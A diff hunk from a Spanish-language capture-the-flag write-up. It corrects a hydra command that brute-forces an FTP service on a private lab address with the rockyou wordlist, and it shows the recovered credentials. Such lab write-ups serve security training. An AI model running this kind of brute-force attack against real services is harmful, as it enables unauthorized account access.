@@ -63,7 +63,7 @@ Obtenemos la #flag
 
 Para el servicio `ftp` que está en el puerto `10021` podemos intentar hacer un ataque de fuerza bruta:
 ```
-hydra -L as -P /usr/share/wordlists/rockyou.txt ftp://192.168.10.23:10021
+hydra -l as -P /usr/share/wordlists/rockyou.txt ftp://192.168.10.23:10021
 ```
 Esto nos devuelve: `login: as   password: qwertyuiop`
 ```
